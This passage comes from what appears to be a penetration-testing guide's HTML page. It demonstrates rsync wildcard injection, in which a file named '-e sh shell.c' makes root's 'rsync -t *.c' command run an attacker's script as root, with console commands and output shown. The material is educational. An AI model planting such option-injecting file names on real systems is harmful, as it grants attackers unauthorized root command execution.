+<p>Rsync is “a fast, versatile, remote (and local) file-copying tool”, that is very common on Unix systems. If we check ‘rsync’ manual page, we can again find options that can be abused for arbitrary command execution.</p>
+<p>Rsync manual: “You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote.”</p>
+<p>Interesting rsync option from manual:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-e, --rsh=COMMAND       specify the remote shell to use</span>
+<span class="go">--rsync-path=PROGRAM    specify the rsync to run on remote machine</span>
+</pre></div>
+</div>
+<p>Let’s abuse one example directly from the ‘rsync’ manual page. Following example will copy all C files in local directory to a remote host ‘foo’ in ‘/src’ directory.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp"># </span>rsync<span class="w"> </span>-t<span class="w"> </span>*.c<span class="w"> </span>foo:src/
+</pre></div>
+</div>
+<p>Directory content:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>ls<span class="w"> </span>-al
+<span class="go">total 72</span>
+<span class="go">drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .</span>
+<span class="go">drwx------. 24 user user  4096 Oct 28 18:32 ..</span>
+<span class="go">-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php</span>
+<span class="go">-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php</span>
+<span class="go">-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c</span>
+<span class="go">-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php</span>
+<span class="go">-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php</span>
+<span class="go">-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php</span>
+<span class="go">-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span>
+</pre></div>
+</div>
+<p>Now root will try to copy all C files to the remote server.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>rsync<span class="w"> </span>-t<span class="w"> </span>*.c<span class="w"> </span>foo:src/
+
+<span class="go">rsync: connection unexpectedly closed (0 bytes received so far) [sender]</span>
+<span class="go">rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]</span>
+</pre></div>
+</div>
+<p>Let’s see what happened…</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>ls<span class="w"> </span>-al
+<span class="go">total 76</span>
+<span class="go">drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .</span>
+<span class="go">drwx------. 24 user user  4096 Oct 28 18:32 ..</span>
+<span class="go">-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php</span>
+<span class="go">-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php</span>
+<span class="go">-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c</span>
+<span class="go">-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php</span>
+<span class="go">-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php</span>
+<span class="go">-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php</span>
+<span class="go">-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php</span>
+<span class="go">-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span>
+<span class="go">-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt</span>
+</pre></div>
+</div>
+<p>There were two files owned by user ‘leon’, as listed below.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c</span>
+<span class="go">-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c</span>
+</pre></div>
+</div>
+<p>After ‘rsync’ execution, new file shell_output.txt whose owner is root is created in same directory.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt</span>
+</pre></div>
+</div>
+<p>If we check its content, following data is found.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>cat<span class="w"> </span>shell_output.txt
+<span class="go">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+</pre></div>
+</div>
+<p>Trick is that because of the ‘*.c’ wildcard, ‘rsync’ got ‘-e sh shell.c’ option on command line, and shell.c will be executed upon’rsync’ start. Content of shell.c is presented below.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">[root@defensecode public]# </span>cat<span class="w"> </span>shell.c
+<span class="go">/usr/bin/id &gt; shell_output.txt</span>
+</pre></div>
+</div>
+</section>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="LFC-VM-P1-FromNothingToUnprivilegedShell.html" class="btn btn-neutral float-left" title="From Nothing to a Unprivileged Shell" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="LFC-VM-P3-TipsAndTricks.html" class="btn btn-neutral float-right" title="Tips and Tricks" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
+  </div>
+
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(false);
+      });
+  </script> 
+
+</body>
+</html>
